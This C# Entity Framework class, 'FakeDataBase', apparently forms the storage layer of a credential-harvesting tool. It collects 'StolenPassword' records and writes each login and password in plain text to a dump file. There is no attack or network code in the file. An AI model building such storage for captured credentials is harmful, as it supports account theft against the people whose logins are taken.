using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace RemoteAdmin.Models
{
    public class FakeDataBase : DbContext
    {
        public static List<StolenPassword> passwords = new List<StolenPassword>();
        public static int Id { get; set; } = 0;

        public DbSet<StolenPassword> Passwords { get; set; }

        public static IEnumerable<StolenPassword> GetPasswords
        {
            get{
                return passwords;
            }
        }

        public FakeDataBase() : base()
        {
                
        }

        protected override void OnConfiguring(DbContextOptionsBuilder builder)
        {
            builder.UseSqlServer(@"Data Source=(localdb)\\mssqllocaldb;
                                 Initial Catalog=FakePasswordsDb;
                                 Integrated Security = true;
                                 MultipleActiveResultSets = true;");
        }

        public static void AddPassword(StolenPassword pass)
        {
            passwords.Add(pass);
        }
        //TODO add Entity FrameWork 
        public static void GetDump(StolenPassword pass)
        {
            Id += 1;
            using (StreamWriter sw = new StreamWriter("d://dump.txt", true))
            {
                sw.WriteLine("Id:" + Id);
                sw.WriteLine("Login:" + pass.Login);
                sw.WriteLine("Pass: " + pass.Password);
                sw.WriteLine();
            }
        }
          
        

    }
}
